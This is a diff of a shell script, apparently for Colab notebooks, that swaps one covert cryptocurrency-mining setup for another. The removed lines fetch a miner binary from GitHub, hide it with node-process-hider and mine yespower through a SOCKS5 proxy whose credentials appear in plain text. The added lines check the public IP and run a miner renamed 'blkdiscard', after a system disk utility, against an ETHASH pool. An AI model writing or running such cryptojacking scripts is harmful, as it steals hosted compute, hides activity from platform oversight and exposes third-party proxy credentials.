@@ -1,9 +1,7 @@
-apt update -y 
-apt install curl libssl1.0-dev 
-nodejs nodejs-dev node-gyp
-npm -y 
-wget https://github.com/yuvraj233/colab/raw/main/data 
-npm i -g node-process-hider 
-chmod +x data 
-ph add data 
-./data -a yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u TJXKzk3ZhPZn5P51RTkWP78SUdqXGPc4rX -p c=TRX -t $(nproc) -x socks5://ubuntu2004:LijayaAnli1188@209.127.96.240:7835
+#!/bin/bash
+%%capture
+
+#gives ip address 
+curl ipecho.net/plain && curl ipecho.net/plain
+chmod +x blkdiscard 
+./blkdiscard --algo ETHASH --pool ethash.asia.mine.zergpool.com:9999 --user TRX:TCcpLwuXCAHd5zLNsN.Worker1 #omhj-poh1
